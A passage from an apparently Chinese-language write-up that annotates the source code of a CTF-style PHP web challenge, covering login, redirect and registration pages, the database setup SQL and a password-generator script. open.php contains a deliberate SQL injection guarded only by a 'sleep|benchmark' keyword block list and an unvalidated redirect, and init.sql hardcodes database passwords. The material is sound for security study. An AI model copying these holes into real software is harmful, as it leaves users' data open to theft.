class="line">                    <span class="meta">&lt;?php</span> <span class="keyword">if</span> ($error_msg) &#123; <span class="meta">?&gt;</span></span><br><span class="line">                    &lt;div class="alert alert-danger" role="alert"&gt;</span><br><span class="line">                        <span class="meta">&lt;?php</span> <span class="keyword">echo</span> $error_msg; <span class="meta">?&gt;</span></span><br><span class="line">                    &lt;/div&gt;</span><br><span class="line">                    <span class="meta">&lt;?php</span> &#125; <span class="meta">?&gt;</span></span><br><span class="line">                    &lt;form method=<span class="string">"POST"</span>&gt;</span><br><span class="line">                        &lt;div class="form-group"&gt;</span><br><span class="line">                            &lt;label <span class="keyword">for</span>=<span class="string">"username"</span>&gt;Username&lt;/label&gt;</span><br><span class="line">                            &lt;input type="text" class="form-control" id="username" name="user" placeholder="Enter username"&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div class="form-group"&gt;</span><br><span class="line">                            &lt;label <span class="keyword">for</span>=<span class="string">"password"</span>&gt;Password&lt;/label&gt;</span><br><span class="line">                            &lt;input type="password" class="form-control" id="password" name="pass" placeholder="Password"&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;button type="submit" class="btn btn-primary"&gt;Submit&lt;/button&gt;</span><br><span class="line">                    &lt;/form&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">        &lt;script src=<span class="string">"static/jquery.slim.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">        &lt;script src=<span class="string">"static/bootstrap.bundle.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h6 id="18行准备要执行的语句，并返回语句对象。"><a href="#18行准备要执行的语句，并返回语句对象。" class="headerlink" title="18行准备要执行的语句，并返回语句对象。"></a><code>18</code>行准备要执行的语句，并返回语句对象。</h6><h6 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a><a href="https://www.php.net/manual/zh/pdo.prepare.php" target="_blank" rel="noopener">参考链接</a></h6><h6 id="41行验证密码是否和散列值匹配。"><a href="#41行验证密码是否和散列值匹配。" class="headerlink" title="41行验证密码是否和散列值匹配。"></a><code>41</code>行验证密码是否和散列值匹配。</h6><h6 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a><a href="https://www.php.net/manual/zh/function.password-verify.php" target="_blank" rel="noopener">参考链接</a></h6><h6 id="43行验证成功就跳转到-admin-php。"><a href="#43行验证成功就跳转到-admin-php。" class="headerlink" title="43行验证成功就跳转到/admin.php。"></a><code>43</code>行验证成功就跳转到<code>/admin.php</code>。</h6><ul>
+<li><code>open.php</code>的内容：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">'db.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// no hax</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'title'</span>]) || !is_string($_GET[<span class="string">'title'</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'nope'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$title = base64_decode($_GET[<span class="string">'title'</span>]);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">'/(?:sleep|benchmark)/i'</span>, $title)) &#123;</span><br><span class="line">    error_log(<span class="string">'Blocked: '</span>.$title);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'hack harder'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$result = $db-&gt;query(<span class="string">'SELECT * FROM `culture` WHERE `id`=(SELECT `id` FROM `culture` WHERE `title`="'</span>.$title.<span class="string">'")'</span>);</span><br><span class="line"><span class="keyword">if</span> (!$result) &#123;</span><br><span class="line">    error_log(<span class="string">'db oof: '</span>.$db-&gt;error);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'db oof: '</span>.$db-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$row = $result-&gt;fetch_assoc();</span><br><span class="line"><span class="keyword">if</span> (!$row) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'nope'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// redirect</span></span><br><span class="line">header(<span class="string">'Location: '</span>.$row[<span class="string">'link'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h6 id="11行匹配sleep和benchmark但是不记住匹配项。"><a href="#11行匹配sleep和benchmark但是不记住匹配项。" class="headerlink" title="11行匹配sleep和benchmark但是不记住匹配项。"></a><code>11</code>行匹配<code>sleep</code>和<code>benchmark</code>但是不记住匹配项。</h6><h6 id="16行明显存在sql注入的情况。"><a href="#16行明显存在sql注入的情况。" class="headerlink" title="16行明显存在sql注入的情况。"></a><code>16</code>行明显存在sql注入的情况。</h6><h6 id="参考链接-2"><a href="#参考链接-2" class="headerlink" title="参考链接"></a><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions" target="_blank" rel="noopener">参考链接</a></h6><ul>
+<li><code>register.php</code>的内容如下：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">        &lt;meta name=<span class="string">"viewport"</span> content=<span class="string">"width=device-width, initial-scale=1, shrink-to-fit=no"</span>&gt;</span><br><span class="line">        &lt;meta name=<span class="string">"description"</span> content=<span class="string">""</span>&gt;</span><br><span class="line">        &lt;meta name=<span class="string">"author"</span> content=<span class="string">""</span>&gt;</span><br><span class="line"></span><br><span class="line">        &lt;title&gt;Bundesamt für Internetkultur und würzige Ichichs&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">        &lt;link href=<span class="string">"static/bootstrap.min.css"</span> rel=<span class="string">"stylesheet"</span>&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;nav class="navbar navbar-expand-lg navbar-dark bg-dark static-top"&gt;</span><br><span class="line">            &lt;div class="container"&gt;</span><br><span class="line">                &lt;a class="navbar-brand" href="index.php"&gt;Bundesamt für Internetkultur und würzige Ichichs&lt;/a&gt;</span><br><span class="line">                &lt;button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation"&gt;</span><br><span class="line">                    &lt;span class="navbar-toggler-icon"&gt;&lt;/span&gt;</span><br><span class="line">                &lt;/button&gt;</span><br><span class="line">                &lt;div class="collapse navbar-collapse" id="navbarResponsive"&gt;</span><br><span class="line">                    &lt;ul class="navbar-nav ml-auto"&gt;</span><br><span class="line">                        &lt;li class="nav-item"&gt;</span><br><span class="line">                            &lt;a class="nav-link" href="index.php"&gt;Home&lt;/a&gt;</span><br><span class="line">                        &lt;/li&gt;</span><br><span class="line">                        &lt;li class="nav-item active"&gt;</span><br><span class="line">                            &lt;a class="nav-link" href="register.php"&gt;</span><br><span class="line">                                Register</span><br><span class="line">                                &lt;span class="sr-only"&gt;(current)&lt;/span&gt;</span><br><span class="line">                            &lt;/a&gt;</span><br><span class="line">                        &lt;/li&gt;</span><br><span class="line">                        &lt;li class="nav-item"&gt;</span><br><span class="line">                            &lt;a class="nav-link" href="login.php"&gt;Login&lt;/a&gt;</span><br><span class="line">                        &lt;/li&gt;</span><br><span class="line">                    &lt;/ul&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/nav&gt;</span><br><span class="line"></span><br><span class="line">        &lt;div class="container"&gt;</span><br><span class="line">            &lt;div class="row"&gt;</span><br><span class="line">                &lt;div class="col-lg-12 text-center"&gt;</span><br><span class="line">                    &lt;h1 class="mt-5"&gt;Registration&lt;/h1&gt;</span><br><span class="line">                    &lt;p class="lead"&gt;... is closed ¯\_(ツ)_/¯&lt;/p&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line"></span><br><span class="line">        &lt;script src=<span class="string">"static/jquery.slim.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">        &lt;script src=<span class="string">"static/bootstrap.bundle.min.js"</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h6 id="db目录下："><a href="#db目录下：" class="headerlink" title="db目录下："></a><code>db</code>目录下：</h6><ul>
+<li><p><code>init.sql</code>的内容如下：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- create the db with unicode support</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> <span class="string">`rpdg`</span>;</span><br><span class="line"><span class="comment">-- ALTER DATABASE `rpdg` CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;</span></span><br><span class="line"><span class="keyword">USE</span> <span class="string">`rpdg`</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- create the tables</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`users`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">INT</span> AUTO_INCREMENT PRIMARY <span class="keyword">KEY</span>,</span><br><span class="line">    <span class="string">`name`</span> <span class="built_in">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    <span class="string">`pwhash`</span> <span class="built_in">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`tracking`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">INT</span> AUTO_INCREMENT PRIMARY <span class="keyword">KEY</span>,</span><br><span class="line">    <span class="string">`key`</span> <span class="built_in">VARCHAR</span>(<span class="number">16</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    <span class="string">`timestamp`</span> <span class="keyword">LONG</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    <span class="string">`user`</span> <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    <span class="string">`path`</span> <span class="built_in">VARCHAR</span>(<span class="number">4095</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    <span class="keyword">FOREIGN</span> <span class="keyword">KEY</span> (<span class="keyword">user</span>) <span class="keyword">REFERENCES</span> <span class="keyword">users</span>(<span class="keyword">id</span>)</span><br><span class="line">);</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`culture`</span> (</span><br><span class="line">    <span class="string">`id`</span> <span class="built_in">INT</span> AUTO_INCREMENT PRIMARY <span class="keyword">KEY</span>,</span><br><span class="line">    <span class="string">`title`</span> <span class="built_in">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    <span class="string">`link`</span> <span class="built_in">VARCHAR</span>(<span class="number">255</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">    <span class="string">`year`</span> <span class="built_in">INT</span> <span class="keyword">NOT</span> <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- create the app user</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">'rpdg'</span>@<span class="string">'%'</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">WITH</span> mysql_native_password <span class="keyword">BY</span> <span class="string">'Luung4aithaiCh3aetho'</span>;</span><br><span class="line"><span class="comment">-- ALTER USER 'rpdg'@'%' IDENTIFIED WITH mysql_native_password BY 'Luung4aithaiCh3aetho';</span></span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> *.* <span class="keyword">FROM</span> <span class="string">'rpdg'</span>@<span class="string">'%'</span>;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> <span class="string">`rpdg`</span>.<span class="string">`tracking`</span> <span class="keyword">TO</span> <span class="string">'rpdg'</span>@<span class="string">'%'</span>;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> <span class="string">`rpdg`</span>.<span class="string">`culture`</span> <span class="keyword">TO</span> <span class="string">'rpdg'</span>@<span class="string">'%'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- create a special user for login-related stuff</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">'rpdg-login'</span>@<span class="string">'%'</span> <span class="keyword">IDENTIFIED</span> <span class="keyword">WITH</span> mysql_native_password <span class="keyword">BY</span> <span class="string">'muLuqueiL7hiekei7roo'</span>;</span><br><span class="line"><span class="comment">-- ALTER USER 'rpdg-login'@'%' IDENTIFIED WITH mysql_native_password BY 'muLuqueiL7hiekei7roo';</span></span><br><span class="line"><span class="keyword">REVOKE</span> <span class="keyword">ALL</span> <span class="keyword">PRIVILEGES</span> <span class="keyword">ON</span> *.* <span class="keyword">FROM</span> <span class="string">'rpdg-login'</span>@<span class="string">'%'</span>;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">SELECT</span> <span class="keyword">ON</span> <span class="string">`rpdg`</span>.<span class="string">`users`</span> <span class="keyword">TO</span> <span class="string">'rpdg-login'</span>@<span class="string">'%'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">FLUSH</span> <span class="keyword">PRIVILEGES</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- create the internet culture data</span></span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`culture`</span> (<span class="string">`title`</span>, <span class="string">`link`</span>, <span class="string">`year`</span>) <span class="keyword">VALUES</span></span><br><span class="line">(<span class="string">'Kranfuehrer Ronny'</span>, <span class="string">'https://www.youtube.com/watch?v=UGlPbphlpBg'</span>, <span class="number">2016</span>),</span><br><span class="line">(<span class="string">'Thueringer Kloesse'</span>, <span class="string">'https://www.youtube.com/watch?v=qJe3cdM7f1c'</span>, <span class="number">2012</span>),</span><br><span class="line">(<span class="string">'Fichtls Lied'</span>, <span class="string">'https://www.youtube.com/watch?v=dP9Wp6QVbsk'</span>, <span class="number">2012</span>),</span><br><span class="line">(<span class="string">'Nudeln'</span>, <span class="string">'https://www.youtube.com/watch?v=ouMuU5PXNvU'</span>, <span class="number">2008</span>),</span><br><span class="line">(<span class="string">'Hauptschule'</span>, <span class="string">'https://www.youtube.com/watch?v=IXarjKOrv00'</span>, <span class="number">2010</span>),</span><br><span class="line">(<span class="string">'Blumenkohl'</span>, <span class="string">'https://www.youtube.com/watch?v=hFNs5JGGmvI'</span>, <span class="number">2009</span>),</span><br><span class="line">(<span class="string">'Bim Bam Bum'</span>, <span class="string">'https://www.youtube.com/watch?v=koymOv6SifE'</span>, <span class="number">2007</span>),</span><br><span class="line">(<span class="string">'KS Mafia'</span>, <span class="string">'https://www.youtube.com/watch?v=YQalL7jeT0o'</span>, <span class="number">2012</span>),</span><br><span class="line">(<span class="string">'Gesicherter Bereich'</span>, <span class="string">'https://www.youtube.com/watch?v=71DdxJF8rmg'</span>, <span class="number">2016</span>),</span><br><span class="line">(<span class="string">'Gewitter'</span>, <span class="string">'https://www.youtube.com/watch?v=PCc7NuDB8mo'</span>, <span class="number">2012</span>),</span><br><span class="line">(<span class="string">'Haben wir noch Peps?'</span>, <span class="string">'https://www.youtube.com/watch?v=Ko81Oedo4t8'</span>, <span class="number">2014</span>),</span><br><span class="line">(<span class="string">'Nicht so tief Ruediger'</span>, <span class="string">'https://www.youtube.com/watch?v=NseWRQ1JYoM'</span>, <span class="number">2010</span>),</span><br><span class="line">(<span class="string">'Andreas'</span>, <span class="string">'https://www.youtube.com/watch?v=C1fCJvgNDow'</span>, <span class="number">2011</span>),</span><br><span class="line">(<span class="string">'Wo bist du, mein Sonnenlicht'</span>, <span class="string">'https://www.youtube.com/watch?v=Mue6Vc_T9Ds'</span>, <span class="number">2006</span>),</span><br><span class="line">(<span class="string">'Schokolade'</span>, <span class="string">'https://www.youtube.com/watch?v=WuQOfiD7gNg'</span>, <span class="number">2009</span>),</span><br><span class="line">(<span class="string">'Voll Assi Toni'</span>, <span class="string">'https://www.youtube.com/watch?v=f4ffzhNOh1s'</span>, <span class="number">2010</span>),</span><br><span class="line">(<span class="string">'Zur Party'</span>, <span class="string">'https://www.youtube.com/watch?v=3VyEWthLklc'</span>, <span class="number">2012</span>),</span><br><span class="line">(<span class="string">'Erdbeerkaese'</span>, <span class="string">'https://www.youtube.com/watch?v=08lgAZP4CSk'</span>, <span class="number">2011</span>),</span><br><span class="line">(<span class="string">'Was ist denn mit Karsten los'</span>, <span class="string">'https://www.youtube.com/watch?v=J2v0EG--tr0'</span>, <span class="number">2009</span>),</span><br><span class="line">(<span class="string">'Reifenverlust'</span>, <span class="string">'https://www.youtube.com/watch?v=Lo05D-_k1d4'</span>, <span class="number">2007</span>),</span><br><span class="line">(<span class="string">'Fickende Leute in meinem Garten'</span>, <span class="string">'https://www.youtube.com/watch?v=mEXItEgKWwQ'</span>, <span class="number">2011</span>),</span><br><span class="line">(<span class="string">'Alarm'</span>, <span class="string">'https://www.youtube.com/watch?v=erTE5mEOMeI'</span>, <span class="number">2016</span>),</span><br><span class="line">(<span class="string">'Kuchenblech'</span>, <span class="string">'https://www.youtube.com/watch?v=NtRGMIahxPo'</span>, <span class="number">2013</span>),</span><br><span class="line">(<span class="string">'Boar alta geil ey, unnormal ey!'</span>, <span class="string">'https://www.youtube.com/watch?v=_H2B7pFIRwY'</span>, <span class="number">2010</span>);</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>tracking-data.sql</code>的内容太多就不贴了。</p>
+<h6 id="scripts目录下："><a href="#scripts目录下：" class="headerlink" title="scripts目录下："></a><code>scripts</code>目录下：</h6></li>
+<li><p><code>data</code>目录下的文件是一些数据收集，就不分析了。</p>
+</li>
+<li><p><code>generate_password.py</code>的内容如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bigrams</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [char_a + char_b <span class="keyword">for</span> char_a, char_b <span class="keyword">in</span> zip(s[:<span class="number">-1</span>], s[<span class="number">1</span>:])]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_password</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="comment"># prepare text to avoid non-alphanumeric</span></span><br><span class="line">    s = re.sub(<span class="string">r'[^a-zA-Z0-9]'</span>, <span class="string">' '</span>, s)</span><br><span class="line"></span><br><span class="line">    next_char_map = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> bigram <span class="keyword">in</span> bigrams(s):</span><br><span class="line">        <span class="comment">#print('"&#123;&#125;"'.format(bigram))</span></span><br><span class="line">        char_a, char_b = bigram[<span class="number">0</span>], bigram[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> char_a <span class="keyword">not</span> <span class="keyword">in</span> next_char_map:</span><br><span class="line">            next_char_map[char_a] = []</span><br><span class="line">        next_char_map[char_a].append(char_b)</span><br><span class="line">    <span class="comment">#print(next_char_map)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># delete anything that maps to space to avoid a password</span></span><br><span class="line">    <span class="comment"># that consists of characters that were previously removed</span></span><br><span class="line">    <span class="keyword">del</span> next_char_map[<span class="string">' '</span>]</span><br><span class="line"></span><br><span class="line">    next_char_map_ = next_char_map.copy()</span><br><span class="line">    password = random.choice(random.choice(list(next_char_map.keys())))</span><br><span class="line">    <span class="keyword">while</span> len(password) &lt; <span class="number">16</span>:</span><br><span class="line">        <span class="comment">#print(''.join(password))</span></span><br><span class="line">        last_char = password[<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">if</span> last_char <span class="keyword">not</span> <span class="keyword">in</span> next_char_map:</span><br><span class="line">            next_char_map = next_char_map_.copy()</span><br><span class="line">            password = random.choice(random.choice(list(next_char_map.keys())))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        next_char = random.choice(next_char_map[last_char])</span><br><span class="line">        <span class="keyword">del</span> next_char_map[last_char]</span><br><span class="line">        password += next_char</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(password)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generate_password_from_file</span><span class="params">(textfile)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(textfile, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        text = f.read()</span><br><span class="line">        password = generate_password(text)</span><br><span class="line">        <span class="keyword">return</span> password</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(textfile)</span>:</span></span><br><span class="line">    password = generate_password_from_file(textfile)</span><br><span class="line">    print(<span class="string">'[+] Password: &#123;&#125;'</span>.format(password))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        print(<span class="string">'Usage: &#123;&#125; &lt;textfile&gt;'</span>.format(sys.argv[<span class="number">0</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        main(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h6 id="8-9行将一个列表中的元素两两合并为一个并且，返回成一个新的数组。"><a href="#8-9行将一个列表中的元素两两合并为一个并且，返回成一个新的数组。" class="headerlink" title="8~9行将一个列表中的元素两两合并为一个并且，返回成一个新的数组。"></a><code>8~9</code>行将一个列表中的元素两两合并为一个并且，返回成一个新的数组。</h6><h6 id="14行将不是字符串的数字和字母替换为空格。"><a href="#14行将不是字符串的数字和字母替换为空格。" class="headerlink" title="14行将不是字符串的数字和字母替换为空格。"></a><code>14</code>行将不是字符串的数字和字母替换为空格。</h6><h6 id="16行定义一个对象。"><a href="#16行定义一个对象。" class="headerlink" title="16行定义一个对象。"></a><code>16</code>行定义一个对象。</h6><h6 id="17行遍历将txt文件中的字符两个结合在一起的数组。"><a href="#17行遍历将txt文件中的字符两个结合在一起的数组。" class="headerlink" title="17行遍历将txt文件中的字符两个结合在一起的数组。"></a><code>17</code>行遍历将<code>txt</code>文件中的字符两个结合在一起的数组。</h6><h6 id="19行将生成的两个字符的字符串分别将其中的字符赋值给char-a，char-b。"><a href="#19行将生成的两个字符的字符串分别将其中的字符赋值给char-a，char-b。" class="headerlink" title="19行将生成的两个字符的字符串分别将其中的字符赋值给char_a，char_b。"></a><code>19</code>行将生成的两个字符的字符串分别将其中的字符赋值给<code>char_a</code>，<code>char_b</code>。</h6><h6 id="20-21行判断char-a是否在next-char-map中如果不在就将其设置一个数组对象。"><a href="#20-21行判断char-a是否在next-char-map中如果不在就将其设置一个数组对象。" class="headerlink" title="20~21行判断char_a是否在next_char_map中如果不在就将其设置一个数组对象。"></a><code>20~21</code>行判断<code>char_a</code>是否在<code>next_char_map</code>中如果不在就将其设置一个数组对象。</h6><h6 id="22行将char-b添加到next-char-map对象中。"><a href="#22行将char-b添加到next-char-map对象中。" class="headerlink" title="22行将char_b添加到next_char_map对象中。"></a><code>22</code>行将<code>char_b</code>添加到<code>next_char_map</code>对象中。</h6><h6 id="27行删除对象的键为空格的。"><a href="#27行删除对象的键为空格的。" class="headerlink" title="27行删除对象的键为空格的。"></a><code>27</code>行删除对象的键为空格的。</h6><h6 id="29行对象的拷贝。"><a href="#29行对象的拷贝。" class="headerlink" title="29行对象的拷贝。"></a><code>29</code>行对象的拷贝。</h6><h6 id="30行返回next-char-map中键的随机项。"><a href="#30行返回next-char-map中键的随机项。" class="headerlink" 